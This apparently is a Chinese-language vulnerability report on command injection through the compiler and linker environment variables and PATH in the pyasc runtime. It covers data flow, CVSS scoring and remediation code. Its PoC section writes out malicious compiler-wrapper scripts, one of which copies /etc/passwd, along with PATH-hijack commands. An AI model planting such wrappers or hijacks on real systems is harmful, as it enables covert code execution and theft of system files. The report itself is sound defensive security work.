# VULN-SEC-RUN-002：命令注入漏洞

## 漏洞概述

**漏洞类型**: 命令注入  
**CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)  
**严重程度**: Critical  
**置信度**: 85%

### 影响文件

- **文件**: `python/asc/runtime/compiler.py`
- **行号**: 106-113
- **函数**: `Compiler.__init__`

### 漏洞描述

编译器/链接器执行路径由环境变量控制。`PYASC_COMPILER` 和 `PYASC_LINKER` 环境变量决定通过 `subprocess.Popen()` 调用的可执行文件。`shutil.which()` 在 PATH 中查找可执行文件。攻击者若能设置这些环境变量（或修改 PATH），可导致执行恶意编译器/链接器二进制文件。

---

## 完整攻击链分析

### 数据流追踪

```
[污点源: 环境变量]
PYASC_COMPILER / PYASC_LINKER
    ↓
compiler.py:106 → shutil.which(os.environ.get('PYASC_COMPILER', 'bisheng'))
    ↓
[PATH 搜索: shutil.which() 在 PATH 中查找可执行文件]
    ↓
compiler.py:109 → self.compiler = compiler
    ↓
[污点传播: 存储编译器路径]
    ↓
compiler.py:145-146 → subprocess.Popen(cmd, ...)
    ↓
[污点汇: 命令执行]
cmd[0] = self.compiler (攻击者控制的编译器)
    ↓
[恶意编译器执行]
```

### 关键代码片段

```python
# compiler.py:106-113
compiler = shutil.which(os.environ.get('PYASC_COMPILER', 'bisheng'))
if compiler is None:
    raise RuntimeError('Compiler executable is not found, check PYASC_COMPILER environment variable')
self.compiler = compiler
linker = shutil.which(os.environ.get('PYASC_LINKER', 'ld.lld'))
if linker is None:
    raise RuntimeError('Linker executable is not found, check PYASC_LINKER environment variable')
self.linker = linker

# compiler.py:145-147
@staticmethod
def _run_cmd(cmd: List[str], cmd_type: str) -> None:
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out, _ = proc.communicate()
```

### 命令构造分析

编译器命令在 `_gen_dst_kernel` 和 `_get_compiler_cmd` 方法中构造：

```python
# compiler.py:330+ (推测)
cmd = [self.compiler, ...compile_options..., source_file, -o, output_file]
_run_cmd(cmd, "compile")
```

---

## PoC 构造思路

### 攻击场景 1: 直接设置编译器路径

```bash
# 1. 创建恶意编译器脚本
cat > /tmp/malicious_bisheng << 'EOF'
#!/bin/bash
# 恶意代码执行
id > /tmp/pwned
# 继续正常编译（可选，用于隐蔽）
exec /usr/bin/bisheng "$@"
EOF
chmod +x /tmp/malicious_bisheng

# 2. 设置环境变量
export PYASC_COMPILER=/tmp/malicious_bisheng

# 3. 运行 pyasc JIT 编译
python -c "
import asc
@asc.jit
def kernel(x):
    pass
kernel(...)
"
# 结果: 恶意脚本被执行，然后正常编译
```

### 攻击场景 2: PATH 劫持

```bash
# 1. 创建恶意目录和编译器
mkdir -p /tmp/attacker_path
cat > /tmp/attacker_path/bisheng << 'EOF'
#!/bin/bash
# 恶意代码
cp /etc/passwd /tmp/stolen_passwd
exec /opt/ascend/bin/bisheng "$@"
EOF
chmod +x /tmp/attacker_path/bisheng

# 2. 修改 PATH 环境变量
export PATH=/tmp/attacker_path:$PATH

# 3. 运行 pyasc（不设置 PYASC_COMPILER，使用默认 'bisheng'）
# shutil.which('bisheng') 会优先找到恶意脚本
python -c "
import asc
@asc.jit
def kernel(x):
    pass
kernel(...)
"
# 结果: shutil.which() 在 PATH 中找到恶意 bisheng
```

### 攻击场景 3: 链接器劫持

```bash
# 同样的方法，劫持 PYASC_LINKER
export PYASC_LINKER=/tmp/malicious_ld
# 恶意链接器在链接阶段执行
```

---

## 利用条件分析

| 条件 | 要求 | 说明 |
|------|------|------|
| 攻击者位置 | 本地 | 需要设置环境变量 |
| 权限要求 | 用户级 | 环境变量设置不需要特殊权限 |
| 文件写入 | 需要 | 需要创建恶意编译器脚本 |
| 用户交互 | 无 | JIT 编译自动调用编译器 |
| 触发时机 | 编译阶段 | kernel 第一次编译或缓存失效 |

---

## 影响分析

### 安全影响

1. **任意代码执行**: 恶意编译器/链接器以 pyasc 进程权限执行
2. **编译产物污染**: 恶意编译器可注入代码到编译产物
3. **供应链攻击**: 污染的编译产物可能影响下游用户

### CVSS 评分分析

- **Attack Vector (AV)**: Local (L)
- **Attack Complexity (AC)**: Low (L)
- **Privileges Required (PR)**: Low (L)
- **User Interaction (UI)**: None (N)
- **Scope (S)**: Changed (C)
- **CIA Impact**: High/High/High

**估算 CVSS 3.1 评分**: 7.8 (High)

---

## 修复建议

### 优先级 1: 编译器白名单验证

```python
# 定义允许的编译器路径
ALLOWED_COMPILERS = {
    'bisheng': ['/opt/ascend/bin/bisheng', '/usr/bin/bisheng'],
    'clang': ['/usr/bin/clang'],
}

ALLOWED_LINKERS = {
    'ld.lld': ['/opt/ascend/bin/ld.lld', '/usr/bin/ld.lld'],
    'ld': ['/usr/bin/ld'],
}

def validate_compiler(compiler_name: str, compiler_path: str) -> bool:
    allowed_paths = ALLOWED_COMPILERS.get(compiler_name, [])
    return compiler_path in allowed_paths

# 在 Compiler.__init__ 中添加验证
compiler_name = os.environ.get('PYASC_COMPILER', 'bisheng')
compiler_path = shutil.which(compiler_name)
if compiler_path is None:
    raise RuntimeError(f'Compiler {compiler_name} not found')
if not validate_compiler(compiler_name, compiler_path):
    raise RuntimeError(f'Compiler {compiler_path} not in allowed list - potential security risk')
self.compiler = compiler_path
```

### 优先级 2: 禁止环境变量覆盖编译器

```python
# 强制使用固定编译器路径
COMPILER_PATH = '/opt/ascend/bin/bisheng'
LINKER_PATH = '/opt/ascend/bin/ld.lld'

# 不从环境变量读取，直接使用固定路径
self.compiler = shutil.which('bisheng') or COMPILER_PATH
self.linker = shutil.which('ld.lld') or LINKER_PATH

# 如果环境变量设置了，发出警告
if os.environ.get('PYASC_COMPILER'):
    warnings.warn("PYASC_COMPILER environment variable is ignored for security reasons")
```

### 优先级 3: 编译器签名验证

```python
import subprocess

def verify_executable_signature(executable_path: str) -> bool:
    # 使用系统签名验证工具
    # Linux: 可以使用 GPG 签名或其他机制
    try:
        result = subprocess.run(
            ['gpg', '--verify', executable_path + '.sig', executable_path],
            capture_output=True, timeout=10
        )
        return result.returncode == 0
    except:
        return False

# 加载前验证
if not verify_executable_signature(self.compiler):
    raise RuntimeError("Compiler signature verification failed")
```

### 优先级 4: 安全审计日志

```python
import logging

def log_compiler_usage(compiler_path: str, source_hash: str):
    logging.info(f"Compiler invocation: path={compiler_path}, source_hash={source_hash}")
    
    # 检测可疑路径
    if '/tmp/' in compiler_path or '/home/' in compiler_path:
        logging.warning(f"Suspicious compiler path: {compiler_path}")
```

---

## 相关漏洞

- **VULN-CROSS-001**: 跨模块环境变量攻击链（包含此漏洞）
- **VULN-SEC-INC-002**: CallOpaqueOp 任意函数调用（类似攻击向量）